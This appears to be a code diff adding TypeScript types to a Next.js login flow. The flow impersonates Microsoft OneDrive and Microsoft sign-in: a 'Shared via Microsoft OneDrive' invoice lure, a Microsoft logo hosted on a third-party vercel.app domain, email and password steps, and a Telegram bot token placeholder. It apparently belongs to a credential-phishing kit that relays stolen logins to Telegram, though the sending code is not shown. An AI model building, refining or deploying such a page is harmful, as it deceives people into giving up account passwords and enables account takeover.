@@ -5,6 +5,29 @@ import { useRouter } from "next/navigation";
 import { KeyRound } from "lucide-react";
 import config from "@/config.json";
 
+interface PreshareStepProps {
+  handleStartLogin: () => void;
+  isLoading: boolean;
+}
+
+interface EmailStepProps {
+  userEmail: string;
+  setUserEmail: (email: string) => void;
+  handleNext: () => void;
+  isLoading: boolean;
+}
+
+interface PasswordStepProps {
+  password: string;
+  setPassword: (pwd: string) => void;
+  showPassword: boolean;
+  handlePasswordToggle: () => void;
+  handleSignIn: () => void;
+  userEmail: string;
+  handleBack: () => void;
+  isLoading: boolean;
+}
+
 // --- Placeholder Configuration ---
 const PDF_URL = "./invoice.pdf";
 const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
@@ -130,7 +153,7 @@ const borderedInputStyle =
 const passwordToggleStyle = "absolute right-3 cursor-pointer text-gray-500";
 
 // --- Step Components (Moved Outside App for Stable Focus) ---
-const PreshareStep = ({ handleStartLogin, isLoading }) => (
+const PreshareStep = ({ handleStartLogin, isLoading }: PreshareStepProps) => (
   <div className="flex flex-col items-center text-center">
     <OneDrivePdfIcon />
     <h2 className="text-2xl font-semibold mb-4 text-gray-800 mt-4">Shared via Microsoft OneDrive</h2>
@@ -149,7 +172,7 @@ const PreshareStep = ({ handleStartLogin, isLoading }) => (
   </div>
 );
 
-const EmailStep = ({ userEmail, setUserEmail, handleNext, isLoading }) => (
+const EmailStep = ({ userEmail, setUserEmail, handleNext, isLoading }: EmailStepProps) => (
   <div>
     <img src="https://onthemetestc.vercel.app/mslogo.png" alt="Microsoft" className="w-32 mb-6" />
     <h2 className="text-2xl font-semibold mb-6">Sign in</h2>
@@ -194,7 +217,7 @@ const PasswordStep = ({
   userEmail,
   handleBack,
   isLoading
-}) => (
+}: PasswordStepProps) => (
   <div>
     <div className="flex items-center">
       <button onClick={handleBack} className="mr-auto text-blue-600 hover:underline text-sm mb-4 inline-block p-1">
